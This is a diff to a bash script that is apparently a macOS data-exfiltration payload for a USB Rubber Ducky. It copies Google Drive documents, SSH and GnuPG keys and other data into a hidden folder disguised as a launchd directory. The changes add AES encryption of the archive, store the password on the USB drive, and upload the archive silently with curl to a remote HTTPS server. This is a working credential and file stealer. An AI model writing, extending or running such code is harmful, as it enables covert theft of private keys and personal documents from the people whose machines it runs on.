@@ -1,15 +1,18 @@
 #!/bin/bash
 
-hidden_dir="$HOME/.sys"
-hidden_file=".l.oo.t.tgz"
-stor_dir="$HOME/.s"
-ssh_private_key="$HOME/.sys/.s"
-remote_path="/tmp"
+random_extension=$(LC_ALL=C tr -dc 'A-Za-z0-9!@#$%^&()_-+' < /dev/urandom | head -c 8)
+encryption_password=$(LC_ALL=C tr -dc 'A-Za-z0-9!@#$%^&()_-+' < /dev/urandom | head -c 32)
+hidden_dir="/private/var/tmp/.com.apple.launchd.$random_extension"
+stor_dir="/private/var/tmp/.com.apple.launchd.$random_extension"
+hidden_file="$random_extension.l.oo.t.tgz"
+ssh_private_key="/Volume/DUCKY/.s"
+remote_path="/"
 
 
 # Remote server configuration
 https_server="localhost"
 https_port="8080"
+https_cert="exfil.crt"
 scp_server="localhost"
 scp_port="2222"
 
@@ -49,7 +52,7 @@ exfil_cloud() {
   fi
 
   google_drive_path="$HOME/Library/CloudStorage/$(ls ~/Library/CloudStorage)"
-  if [ -d "$google_drive_path" ]; then
+  if [ -d $HOME/Library/CloudStorage ]; then
     cd "$google_drive_path"
     cd My\ Drive
     find ./ -type f \( -name "*.doc" -o -name "*.docx" -o -name "*.xls" -o -name "*.xlsx" -o -name "*.ppt" -o -name "*.pdf" -o -name "*.csv" -o -name "*.odt" \) -exec rsync -a --relative {} "$hidden_dir/cloud_files/" \; &> /dev/null
@@ -97,7 +100,6 @@ exfil_bt() {
 
 exfil_keys() {
   mkdir -p "$hidden_dir/keys"
-  ssh-add -L >> $hidden_dir/keys/active_ssh_keys.txt
   cp -r ~/.ssh  $hidden_dir/keys/ &> /dev/null
   cp -r ~/.gnupg $hidden_dir/keys/ &> /dev/null
 }
@@ -133,7 +135,8 @@ exfil_config() {
 exfil_compress() {
   mkdir -p "$stor_dir"
   cd "$stor_dir"
-  nohup tar czf "$stor_dir/$hidden_file" "$hidden_dir" &> /dev/null
+  nohup tar cfz - "$hidden_dir" | openssl enc -aes-256-cbc -salt -out "$stor_dir/$hidden_file.enc" -pass pass:$encryption_password &> /dev/null
+  echo $encryption_password | base64 > /Volumes/DUCKY/.encpw
 
   if [ $? -ne 0 ]; then
     cleanup
@@ -144,11 +147,18 @@ exfil_compress() {
 }
 
 exfiltrate() {
-  nohup curl --upload-file "$stor_dir/$hidden_file" https://$https_server:$https_port/upload --insecure &> /dev/null &
+  if [ -e $https_cert ]; then
+    nohup curl --cert $https_cert --upload-file "$stor_dir/$hidden_file.enc" https://$https_server:$https_port/ &> /dev/null &
+  else 
+    nohup curl --insecure --upload-file "$stor_dir/$hidden_file.enc" https://$https_server:$https_port/ &> /dev/null &
+  fi
+    
   if [ $? -ne 0 ]; then
     cleanup
     exit 1
   fi
+  
+  exfiltrate_pid=$!
 }
 
 cleanup() {
@@ -178,9 +188,11 @@ exfil_keychains
 
 wait $exfil_files_pid $exfil_cloud_pid $exfil_browsers_pid
 exfil_compress & 
+disown
 
 
 # exfiltrate &
 
-#wait exfiltrate_pid
-# cleanup &
+#wait $exfiltrate_pid
+#wait $exfil_compress 
+#cleanup &
